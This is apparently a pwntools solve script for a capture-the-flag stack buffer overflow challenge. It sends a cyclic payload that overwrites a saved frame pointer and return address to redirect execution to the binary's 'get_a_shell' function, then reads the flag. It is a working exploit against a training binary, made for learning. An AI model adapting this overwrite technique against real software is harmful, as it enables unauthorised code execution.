# SETUP BOILERPLATE
from pwn import *
import os

elf = ELF('./bof-level10') # replace this with the actual level
DEBUG = False # toggles gdb.debug or process

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = elf.debug(env={}, gdbscript="""
b *0x080485d3
continue
""")

else:
    io = elf.process(env={})


# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE

get_a_shell = p32(elf.symbols["get_a_shell"])

target_stack = 0xffffde20

# 0x62616167
# gaab

# 0x62616163 = caab
payload = cyclic(256).replace(b"gaab", p32(target_stack + 4)).replace(b"jaab", get_a_shell)

io.sendline(payload)


# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

import re
io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
print(flag)
